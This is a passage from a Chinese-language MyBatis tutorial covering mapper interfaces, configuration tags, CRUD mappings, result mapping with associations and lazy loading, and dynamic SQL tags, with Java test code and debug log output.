\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 7. 创建查询\n\npublic static void main(String[] args) {  \n String resource = "mybatis-config.xml";  \n InputStream resourceAsStream = null;  \n SqlSession sqlSession = null;  \n try {  \n resourceAsStream = Resources.getResourceAsStream(resource);  \n SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);  \n sqlSession = sqlSessionFactory.openSession();  \n  \n Employee employee = sqlSession.selectOne("com.pwddd.mybatis3.EmployeeMapper.getEmpById", 1);  \n System.out.println(employee);  \n } catch (IOException e) {  \n e.printStackTrace();  \n } finally {  \n sqlSession.close();  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口式编程方式\n\n 1. 创建接口\n\npackage com.pwddd.mybatis3.dao;  \n  \nimport com.pwddd.mybatis3.entity.Employee;  \n  \npublic interface EmployeeMapper {  \n Employee getEmpById(Integer id);  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. namespace配置接口全类名\n\n<mapper namespace="com.pwddd.mybatis3.dao.EmployeeMapper">\n\n\n1\n\n 3. mapper.xml中查询方法名和接口中定义的方法名一致\n\n<select id="getEmpById" resultType="com.pwddd.mybatis3.entity.Employee">  \n select id,last_name as lastName,email,gender from tbl_employee where id = #{id}  \n</select>\n\n\n1\n2\n3\n\n 4. 编写测试方法\n\n@Test\npublic void testInterface() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n    Employee emp = mapper.getEmpById(1);\n    System.out.println(emp);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# MyBatis配置文件\n\n\n# properties 标签\n\n在Mybatis配置文件中的一些属性（如数据库链接的相关信息）可以配置在外部的配置文件中，通过properties标签将外部的配置文件引入，然后使用${}将配置导入到mybatis配置文件中。具体的用法如下面所示：\n\n<properties resource="jdbc.properties" />\n\n\n1\n\n\n除此之外，还可以在properties 标签内设置相关属性的值，但是这样不会替换掉外部配置文件中设置的值，只是增加值：\n\n<properties resource="jdbc.properties">  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n</properties>\n\n\n1\n2\n3\n4\n\n\n除此之外，还可以在创建SqlSessionFactory时将配置文件传入：\n\n@Test\npublic void testResource() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    Properties properties = new Properties();\n    properties.load(new FileInputStream(new File("src/main/resources/jdbc.properties")));\n    SqlSessionFactory build = new SqlSessionFactoryBuilder().build(resourceAsStream, properties);\n    SqlSession sqlSession = build.openSession();\n    System.out.println(sqlSession);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n从Mybatis 3.4.2版本开始，可以为属性设置一个默认值，如果获取不到值则使用默认值，但是默认值的属性没有开启，并且默认的分隔符是：，可以使用如下的配置进行设置和使用。修改默认的分隔符的目的是如果属性名中含有其他的冒号则容易冲突，如果不含，那么可以正常使用默认值：\n\n<property name="org.apache.ibatis.parsing.PropertyParser.enable-default-value" value="true"/>  \n<property name="org.apache.ibatis.parsing.PropertyParser.default-value-separator" value="?:"/>\n\n<property name="username" value="${mysql.username?:root}"/>\n\n\n1\n2\n3\n4\n\n\n\n# settings 标签\n\n这是 MyBatis 中极为重要的调整设置，它们会改变 MyBatis 的运行时行为。用来对Mybatis进行一些设置的配置。\n\n常用的配置内容和功能如下：\n\n#TODO\n\n\n\n开启驼峰命名：\n\n<setting name="mapUnderscoreToCamelCase" value="true"/>\n\n\n1\n\n\n数据库对于NULL值的匹配处理\n\n<setting name="jdbcTypeForNull" value="Null"/>\n\n\n1\n\n\n开启分步查询懒加载：\n\n<setting name="lazyLoadingEnabled" value="true"/>\n\x3c!--        按照需要进行属性的加载--\x3e\n<setting name="aggressiveLazyLoading" value="false"/>\n\n\n1\n2\n3\n\n\n\n# typeAliases 别名处理器\n\n用于给类型起别名，仅用于 XML 配置，意在降低冗余的全限定类名书写。在通常情况下，我们在Mapper中配置的ResultType通常为类的全类名，这种方法过于冗余，可以使用别名的方式，以后配置就可以用别名代替全类名了。\n\n<typeAliases>\n    <typeAlias type="com.pwddd.mybatis.bean.Employee" alias="emp" />\n</typeAliases>\n\n\n1\n2\n3\n\n\n除此之外，还可以配置批量包下面的别名，如下配置中的包下的所有类都会有一个首字母小写的别名：\n\n<typeAliases> \n\t<package name="domain.blog"/> \n</typeAliases>\n\n\n1\n2\n3\n\n\n还可以使用注解的方式，为类起别名，但是前提是配置包的别名：\n\n<typeAliases>  \n    <package name="com.pwddd.hello.entity"/>  \n    \x3c!--        <typeAlias type="com.pwddd.hello.entity.Employee" alias="employee" />--\x3e  \n</typeAliases>\n\n\n1\n2\n3\n4\n\n\n@Alias("emp")  \npublic class Employee {\n\n\n1\n2\n\n\n\n# typeHandlers\n\nMyBatis 在设置预处理语句（PreparedStatement）中的参数或从结果集中取出一个值时， 都会用类型处理器将获取到的值以合适的方式转换成 Java 类型。从 3.4.5 开始，MyBatis 默认支持 JSR-310（日期和时间 API）。\n\n\n# plugins\n\nMyBatis 允许你在映射语句执行过程中的某一点进行拦截调用。默认情况下，MyBatis 允许使用插件来拦截的方法调用包括：\n\n * Executor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed)\n * ParameterHandler (getParameterObject, setParameters)\n * ResultSetHandler (handleResultSets, handleOutputParameters)\n * StatementHandler (prepare, parameterize, batch, update, query)\n\n\n# environments\n\nMybaits为了更好的适应多种数据库的连接需要，并且方便多个数据库之间的切换使用，使用environments对数据库进行配置。environments标签有一个default属性用于指定当前使用的环境。在environments标签下又有ENVIRONMENT标签，用于配置多个数据库环境。\n\n<environments default="mysql">  \n <environment id="mysql">  \n <transactionManager type="JDBC" />  \n <dataSource type="POOLED">  \n <property name="driver" value="${mysql.driver}"/>  \n <property name="url" value="${mysql.url}"/>  \n <property name="username" value="${username?:root}"/>  \n <property name="password" value="${mysql.password}"/>  \n </dataSource>  \n </environment>  \n</environments>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# transactionManager\n\n在 MyBatis 中有两种类型的事务管理器（也就是 type="[JDBC|MANAGED]"）：\n\n * JDBC – 这个配置直接使用了 JDBC 的提交和回滚设施，它依赖从数据源获得的连接来管理事务作用域。\n * MANAGED – 这个配置几乎没做什么。它从不提交或回滚一个连接，而是让容器来管理事务的整个生命周期（比如 JEE 应用服务器的上下文）。 默认情况下它会关闭连接。\n\n但是如果使用的spring+Mybatis，则可以将事务处理交给Spring来做。\n\n# dataSource\n\nMybatis有三大内建的数据源：\n\n * UNPOOLED：这个数据源的实现会每次请求时打开和关闭连接。\n * POOLED：这种数据源的实现利用“池”的概念将 JDBC 连接对象组织起来，避免了创建新的连接实例时所必需的初始化和认证时间。 这种处理方式很流行，能使并发 Web 应用快速响应请求。\n * JNDI：这个数据源实现是为了能在如 EJB 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置一个 JNDI 上下文的数据源引用。\n\n除此之外还可以自定义数据源，type为自定义数据源的全类名。\n\n\n# databaseIdProvider\n\nMyBatis为不同的数据库设置了不同的数据库的标识。这种多厂商的支持是基于映射语句中的 databaseId 属性。 MyBatis 会加载带有匹配当前数据库 databaseId 属性和所有不带 databaseId 属性的语句。这种多厂商的支持是基于映射语句中的 databaseId 属性。 MyBatis 会加载带有匹配当前数据库 databaseId 属性和所有不带 databaseId 属性的语句。只需要为不同的sql语句配置数据库标签（dataBaseId）即可。\n\n<databaseIdProvider type="DB_VENDOR">  \n <property name="SQL Server" value="sqlserver"/>  \n <property name="DB2" value="db2"/>  \n <property name="Oracle" value="oracle" />  \n</databaseIdProvider>\n\n\n1\n2\n3\n4\n5\n\n\n\n# mappers\n\n我们需要告诉Mabatis去哪里寻找我们的mapper配置文件。你可以使用相对于类路径的资源引用，或完全限定资源定位符（包括 file:/// 形式的 URL），或类名和包名等。例如：\n\n\n\x3c!-- 使用相对于类路径的资源引用 --\x3e  \n<mappers>  \n <mapper resource="org/mybatis/builder/AuthorMapper.xml"/>  \n <mapper resource="org/mybatis/builder/BlogMapper.xml"/>  \n <mapper resource="org/mybatis/builder/PostMapper.xml"/>  \n</mappers>  \n\x3c!-- 使用完全限定资源定位符（URL） --\x3e  \n<mappers>  \n <mapper url="file:///var/mappers/AuthorMapper.xml"/>  \n <mapper url="file:///var/mappers/BlogMapper.xml"/>  \n <mapper url="file:///var/mappers/PostMapper.xml"/>  \n</mappers>  \n\x3c!-- 使用映射器接口实现类的完全限定类名 --\x3e  \n<mappers>  \n <mapper class="org.mybatis.builder.AuthorMapper"/>  \n <mapper class="org.mybatis.builder.BlogMapper"/>  \n <mapper class="org.mybatis.builder.PostMapper"/>  \n</mappers>  \n\x3c!-- 将包内的映射器接口实现全部注册为映射器 --\x3e  \n<mappers>  \n <package name="org.mybatis.builder"/>  \n</mappers>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中，使用映射器接口实现类的完全限定类名进行注册时，可以使用注解的方式进行配置。\n\n\t@Select("select * from tbl_employee where id=#{id}")\n\tpublic Employee getEmpById(Integer id);\n\n\n1\n2\n\n\n这种方式虽然便捷，但是对于复杂的SQL语句不是很友好，因此复杂的语句建议还是在Mapper配置文件中编写。\n\n\n# Mapper映射文件\n\nSQL 映射文件只有很少的几个顶级元素（按照应被定义的顺序列出）：\n\n * cache – 该命名空间的缓存配置。\n * cache-ref – 引用其它命名空间的缓存配置。\n * resultMap – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素。\n * parameterMap – 老式风格的参数映射。此元素已被废弃，并可能在将来被移除！请使用行内参数映射。文档中不会介绍此元素。\n * sql – 可被其它语句引用的可重用语句块。\n * insert – 映射插入语句。\n * update – 映射更新语句。\n * delete – 映射删除语句。\n * select – 映射查询语句。\n\n\n# 增删改查\n\nMapper映射文件：\n\n<select id="getEmpById" resultType="employee">\n        select * from tbl_employee where id = #{id}\n    </select>\n\n    <insert id="addEmp" >\n        insert into tbl_employee(last_name,gender,email) values (#{lastName},#{gender},#{email})\n    </insert>\n\n    <update id="updateEmp" >\n        update tbl_employee\n            set last_name = #{lastName},\n             gender = #{gender},\n             email = #{email}\n        where id = #{id};\n    </update>\n\n    <delete id="deleteEmp" >\n        delete\n        from tbl_employee\n        where id=#{id};\n    </delete>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n对应接口：\n\nEmployee getEmpById(Integer id);\nInteger addEmp(Employee employee);\nInteger updateEmp(Employee employee);\nInteger deleteEmp(Integer id);\n\n\n1\n2\n3\n4\n\n\n测试：\n\n@Test\npublic void testCRUD() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    EmployeeMapper employeeMapper = sqlSession.getMapper(EmployeeMapper.class);\n    System.out.println(employeeMapper.deleteEmp(2));\n    System.out.println(employeeMapper.addEmp(new Employee(4, "zhangsan", 1, "123@qq.com")));\n    System.out.println(employeeMapper.updateEmp(new Employee(1, "wangwu", 1, "wangwu@qq.com")));\n    sqlSession.commit();  // 由于mybatis默认关闭了自动提交功能 因此需要手动提交执行才会影响数据库\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 传入参数处理\n\n 1. 传递单个参数：#{任意} mybatis不做处理\n 2. 多个参数：\n    * SQL中使用#{参数名}和接口名中传递的参数同名，这种方式会出错，多个参数会被封装成map，#{}从map中取值，可以使用param1,param2或者0，1直接取值。\n    * 命名参数：使用注解改变将封装map的key，@Param("id")，直接使用#{id}取值\n 3. 如果多个参数，使用pojo对象，#{}传递pojo对象属性\n 4. 直接传入map，#{key}传递map对象对应的key值。\n 5. 经常要使用的多个参数，可以封装成TO对象。\n 6. 如果传递的是Collection(Set List)、数组，也会进行特殊封装到map中，List使用#{list[0]}，数组使用#{array[0]}\n\n\n\n\n# 查询结果返回\n\n * 如果返回的是一个集合，则resultType返回集合的泛型。\n\n    <select id="selectAllEmp" resultType="employee">\n        select * from tbl_employee\n    </select>\n\n\n1\n2\n3\n\n * 如果返回一个map，key是列名，value是值的内容，resultType则是map。\n\n    <select id="selectById" resultType="map">\n        select * from tbl_employee where id=#{id}\n    </select>\n\n\n1\n2\n3\n\n * 如果返回一个map，key是主键，value是所有的查询结果。resultType是map中封装的类型，并给方法加上@MapKey注解，指明主键。\n\n<select id="selectAll" resultType="employee">\nselect * from tbl_employee\n</select>\n\n\n1\n2\n3\n\n\n    @MapKey("id")\n    Map<Integer,Employee> selectAll();\n\n\n1\n2\n\n\n\n# 封装返回结果\n\n当数据库列名和我们定义的javaBean属性名不一致时，使用resultType指定返回值类型将会导致查出来的数据无法注入到结果中。有三种解决方式：\n\n * 如果数据库中的列名和javabean属性名满足驼峰命名法的转换，则在mybatis配置文件中开启驼峰命名法转换即可\n * 查询数据库语句起别名\n * 使用resultMap封装返回结果\n\n<resultMap id="emp" type="com.pwddd.mybatis.bean.Employee">\n    <id property="id" column="id" />\n    <result property="lastName" column="last_name" />\n    <result property="gender" column="gender" />\n    <result property="email" column="email" />\n</resultMap>\n<select id="selectById" resultMap="emp">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 联合查询的结果返回\n\n# 方式一：使用级联赋值方式\n\n<resultMap id="empanddept" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <result column="did" property="dept.did" />\n    <result column="dname" property="dept.dname" />\n</resultMap>\n\n<select id="selectEmpAndDeptById" resultMap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 方式二：使用association赋值\n\n<resultMap id="empanddept" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    \x3c!--        <result column="did" property="dept.did" />--\x3e\n    \x3c!--        <result column="dname" property="dept.dname" />--\x3e\n    <association property="dept" javaType="com.pwddd.mybatis.bean.Dept">\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultMap>\n\n<select id="selectEmpAndDeptById" resultMap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 方式三：分步查询\n\n 1. 按照员工ID查出员工信息\n 2. 根据查询的员工信息中的did 查询对应的dept信息\n 3. 将部门设置到dept属性中\n\n<resultMap id="step" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <association property="dept" select="com.pwddd.mybatis.mapper.DeptMapper.selectById" column="did" >\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultMap>\n<select id="getEmpByIdStep" resultMap="step">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 基于分步查询的延迟加载功能\n\nmybatis配置文件中增加开启懒加载配置：\n\n<setting name="lazyLoadingEnabled" value="true"/>\n\x3c!--        按照需要进行属性的加载--\x3e\n<setting name="aggressiveLazyLoading" value="false"/>\n\n\n1\n2\n3\n\n\n只使用employee中的字段时，就只查询一条SQL语句\n\n@Test\npublic void testStep() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    EmployeeMapperPlus mapper1 = sqlSessionFactory.openSession().getMapper(EmployeeMapperPlus.class);\n    Employee empByIdStep = mapper1.getEmpByIdStep(1);\n    System.out.println(empByIdStep.getEmail());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n[2022-02-20 20:23:29:798-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:23:29:799-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:23:29:841-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nwangwu@qq.com\n\n\n1\n2\n3\n4\n\n\n当时用到dept中查询的字段时再加载第二条SQL语句\n\n@Test\npublic void testStep() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    EmployeeMapperPlus mapper1 = sqlSessionFactory.openSession().getMapper(EmployeeMapperPlus.class);\n    Employee empByIdStep = mapper1.getEmpByIdStep(1);\n    System.out.println(empByIdStep.getEmail());\n    System.out.println("============================================");\n    System.out.println(empByIdStep.getDept().getDid());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n[2022-02-20 20:26:02:673-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:26:02:702-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:26:02:748-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nwangwu@qq.com\n============================================\n[2022-02-20 20:26:02:748-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_dept where did = ?\n[2022-02-20 20:26:02:749-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:26:02:751-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\n1\n\nProcess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 联合查询的集合结果返回\n\n一个部门有多个员工，查询部门时，返回部门下的所有员工。\n\n# 方式一：多表联合查询\n\n<resultMap id="depts" type="com.pwddd.mybatis.bean.Dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    \x3c!-- ofType 定义集合中的泛型类型--\x3e\n    <collection property="employees" ofType="com.pwddd.mybatis.bean.Employee" >\n        <id column="id" property="id" />\n        <result column="last_name" property="lastName" />\n        <result column="email" property="email" />\n        <result column="gender" property="gender" />\n    </collection>\n\n</resultMap>\n<select id="getDeptById" resultMap="depts" >\n    select e.id,e.last_name,e.email,e.gender,d.did,d.dname\n    from tbl_employee e, tbl_dept d\n    where d.did = e.did\n    and e.did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 方式二：分步查询\n\n<resultMap id="deptsstep" type="com.pwddd.mybatis.bean.Dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    <collection property="employees" select="com.pwddd.mybatis.mapper.EmployeeMapperPlus.getEmpByDid"\n                ofType="com.pwddd.mybatis.bean.Employee" column="did" />\n</resultMap>\n\n<select id="getDeptByStep" resultMap="deptsstep" >\n    select * from tbl_dept where did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 多列step查询\n\n如果需要分步查询，第一步查询的结果的多列作为第二步查询的条件，可以封装成map\n\ncolumn="{did=did,dname=dname}"\n\n\n1\n\n\n\n# 关于延迟加载\n\n针对分步查询可以单独设置懒加载\n\n fetchType="eager" 不开启懒加载\n  fetchType="lazy" 开启懒加载\n\n\n1\n2\n\n\n\n# 鉴别器\n\n鉴别器可以根据条件设置查询的结果，比如如果是女生才将dept的结果返回，如果是男生，则将lastname的值赋值给email的值。虽然没有意义，只用来测试。\n\n<resultMap id="gete" type="com.pwddd.mybatis.bean.Employee" >\n<id column="id" property="id" />\n<result column="last_name" property="lastName" />\n<result column="gender" property="gender" />\n<result column="email" property="email" />\n<discriminator javaType="string" column="gender">\n<case value="0">\n<association property="dept" select="com.pwddd.mybatis.mapper.DeptMapper.selectById" column="did"/>\n</case>\n<case value="1">\n<result column="last_name" property="email" />\n</case>\n</discriminator>\n</resultMap>\n\n\n<select id="getE" resultMap="gete" >\nselect * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 动态SQL语句\n\n动态SQL解决的是按照条件拼装SQL的问题。使用不同的标签，mybatis可以根据传递的参数条件动态的拼接SQL语句。\n\n\n# if标签\n\nif标签可以根据传入的参数判断是否拼接查询条件\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    where\n    <if test="id!=null" >\n        id = #{id}\n    </if>\n\n    <if test="lastName != null">\n        and last_name=#{lastName}\n    </if>\n\n    <if test="email != null">\n        and email = #{email}\n    </if>\n\n    <if test="gender != null">\n        and gender = #{gender}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# where标签\n\n这种拼接有一个问题，就是当id不存在时，后面的语句拼接会多一个and。常见的解决方法有两个：\n\n 1. where 后面拼接一个 1=1\n 2. 使用where标签，去除前置的and 或者 or条件\n\n第一种方式：\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    where 1=1\n    <if test="id!=null" >\n        and id = #{id}\n    </if>\n\n    第二种方式：\n    <select id="getEmpsByCondition" resultType="employee" >\n        select * from tbl_employee\n        <where>\n            <if test="id!=null" >\n                id = #{id}\n            </if>\n\n            <if test="lastName != null">\n                and last_name=#{lastName}\n            </if>\n\n            <if test="email != null">\n                and email = #{email}\n            </if>\n\n            <if test="gender != null">\n                and gender = #{gender}\n            </if>\n        </where>\n    </select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n上面的这种写法，如果在拼接条件时，and写在条件后面还会出问题，因为where标签只会删除掉第一个多余的and。\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    <where>\n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastName != null">\n            last_name=#{lastName} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# trim标签\n\n使用trim标签，可以解决上述问题，trim标签有如下的属性：\n\n * prefix : 给语句加上一个前缀\n * prefixOverides : 覆盖掉前缀的字符串\n * suffix : 给语句加上一个后缀\n * suffixOverrides : 覆盖掉后缀的字符串\n\n上述的查询可以改成如下内容：\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    <trim prefix="where" suffixOverrides="and">        \n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastName != null">\n            last_name=#{lastName} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </trim>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# choose标签\n\nchoose标签类似于java中的switch-case语句。\n\n<select id="getEmpsByCOnditionChoose" resultType="employee">\n    select * from tbl_employee\n    <where>\n        <choose>\n            <when test="id!=null">\n                id = #{id}\n            </when>\n\n            <when test="lastName != null">\n                and last_name = #{lastName}\n            </when>\n\n            <otherwise>\n                and gender = 1\n            </otherwise>\n        </choose>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# set标签\n\nwhere标签中封装的是查询的条件，而set标签中封装的是更新条件。\n\n如果我们不使用set标签，而使用if标签拼接update语句的set条件的话，则会导致后面多一个逗号，SQL执行报错。\n\n<update id="updateEmp">\n    update tbl_employee\n    set\n    <if test="lastName != null">\n        last_name = #{lastName},\n    </if>\n    <if test="gender != null">\n        gender = #{gender},\n    </if>\n    <if test="email != null" >\n        email = #{email}\n    </if>\n\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n[2022-02-21 14:33:36:972-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: update tbl_employee set last_name = ?, where id = ?\n[2022-02-21 14:33:36:997-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: lisi(String), 1(Integer)\n\n\n1\n2\n\n\n使用set标签可以去除后面多余的逗号。\n\n<update id="updateEmp">\n    update tbl_employee\n    <set>\n        <if test="lastName != null">\n            last_name = #{lastName},\n        </if>\n        <if test="gender != null">\n            gender = #{gender},\n        </if>\n        <if test="email != null" >\n            email = #{email}\n        </if>\n    </set>\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# foreach标签\n\nforeach标签用来遍历传递过来的list或者map，常用来做in查询或者批量新增。\n\nforeach标签有如下的属性可以选择：\n\n * collection: 传进来的集合参数\n * item: 遍历出来的单个值\n * open: foreach拼接的开始符号\n * close: foreach拼接的结束符号\n * separator: 元素之间的分隔符\n * index: 对于list来说，index是索引，item是value，对于map而言，index是key，item是value\n\nIN查询employee\n\n<select id="getEmpsByIn" resultType="employee">\n    select * from tbl_employee\n    where id in\n    <foreach collection="list" item="id" open="(" separator="," close=")">\n        #{id}\n    </foreach>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ninsert批量插入数据\n\n<insert id="addEmps" >\n    insert into tbl_employee(id,last_name,gender,email)\n    values\n    <foreach collection="collection"  separator="," item="emp">\n        (#{emp.id},#{emp.lastName},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n第二种方式需要数据库开启可以批量提交\n\njdbc.url=jdbc:mysql://localhost:3306/mybatis?allowMultiQueries=true\n\n\n1\n\n\n<insert id="addEmps" >\n    <foreach collection="list" item="emp" separator=";" >\n        insert into tbl_employee(id,last_name,gender,email)\n        values (#{emp.id},#{emp.lastName},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 两个内置参数\n\nmybatis中有两个内置参数可以用来取值。\n\n * _parameter: 代表整个参数，如果传递多个参数，参数会被封装成一个map _parameter就代表这个map\n * _databaseId: 如果配置了databaseIdProvider标签，则该值就代表我们配置的值。\n\n栗子：\n\n<select id="getDept" resultType="dept" >\n    <if test="_databaseId=mysql">\n        select * from tbl_dept where did = #{did}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# bind标签\n\nbind标签可以将OGNL表达式绑定到一个变量上。我们可以使用如下的方式进行模糊查询\n\nSystem.out.println(mapper.getLikeEmp("%a%"));\n\n\n1\n\n\n我们也可以将%放到sql语句中，但不能使用下面的方式：\n\nselect * from tbl_employee\nwhere last_name like "%#{lastName}%"  -- like后面的查询条件应该是一个整体\nselect * from tbl_employee\nwhere last_name like "%${lastName}%"  -- 拼接不安全\n\n\n1\n2\n3\n4\n\n\n我们可以使用bind将拼接进行绑定\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select * from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# sql标签\n\nsql标签可以将多次的查询语句进行保存，下次使用直接引用。可以使用inclue进行引用。\n\n\n<sql id="emp">\n    id,last_name,email,gender\n</sql>\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select \n    <include refid="emp" 